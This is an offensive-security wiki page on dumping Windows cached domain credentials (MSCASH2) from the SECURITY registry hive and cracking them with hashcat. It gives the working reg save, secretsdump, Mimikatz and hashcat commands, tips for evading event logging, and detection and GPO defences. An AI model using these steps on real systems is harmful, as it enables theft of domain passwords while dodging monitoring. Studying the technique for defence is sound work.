---
title: Cached Domain Credentials (MSCASH/MSCASH2)
slug: cached-domain-credentials
---

> **TL;DR:** Up to ten domain users that logged on interactively are stored as MSCASH2 (DCC2) hashes under the SECURITY registry hive — dump them offline, crack with hashcat mode 2100, and you've got cleartext domain passwords without ever touching LSASS or a DC.

## What it is
To survive a missing domain controller, Windows caches a salted PBKDF2-style derivative of each interactive domain logon under `HKLM\SECURITY\Cache\NL$1..NL$10`. Pre-Vista the algorithm was MSCASH (MD4 over `MD4(NT) + lowercase(username)`); Vista+ uses MSCASH2 — PBKDF2-HMAC-SHA1 with 10240 iterations over the MSCASH1 value. These hashes are **not** pass-the-hashable; their value is offline cracking of high-privilege domain accounts.

## Preconditions / where it applies
- Local SYSTEM (or `SeBackupPrivilege` + `SeRestorePrivilege`) to read the SECURITY and SYSTEM hives
- The target must have had at least one interactive / RDP / RunAs domain logon — service-only accounts and cached creds disabled by GPO will be absent
- All supported Windows client and server versions store cached creds by default (cap configurable via `CachedLogonsCount`)

## Technique
Save the SYSTEM and SECURITY hives offline, then extract with `secretsdump.py -security -system` or Mimikatz `lsadump::cache`. Hashes drop out as `$DCC2$10240#user#hex` ready for hashcat.

```cmd
reg save HKLM\SYSTEM   C:\temp\sys.hive
reg save HKLM\SECURITY C:\temp\sec.hive
:: from attacker box
secretsdump.py -system sys.hive -security sec.hive LOCAL
:: or in-memory:
mimikatz # token::elevate
mimikatz # lsadump::cache
:: crack offline
hashcat -m 2100 dcc2.txt rockyou.txt
```

OPSEC: `reg save` against the SECURITY hive is logged (4663 with object name `\REGISTRY\MACHINE\SECURITY`). A stealthier path is reading the hive via a volume shadow copy or directly through `RegOpenKeyEx` with `SeBackupPrivilege`. See [[lsa-secrets]] for the sibling artefacts in the same hive.

## Detection and defence
- Sysmon EID 11 / 4663 on file creation against `\Windows\System32\config\SECURITY` or shadow-copy equivalents
- GPO `Interactive logon: Number of previous logons to cache = 0` removes the target on workstations that always have DC reachability; balance against laptop usability
- Microsoft Defender for Identity / EDR signatures on `lsadump::cache` and on `secretsdump` LSA secret extraction patterns

## References
- [ired.team — Dumping and Cracking MSCASH](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-and-cracking-mscash-cached-domain-credentials) — original walkthrough
- [MITRE ATT&CK T1003.005](https://attack.mitre.org/techniques/T1003/005/) — Cached Domain Credentials sub-technique

Related: [[credential-dumping]], [[lsa-secrets]], [[dcsync]]
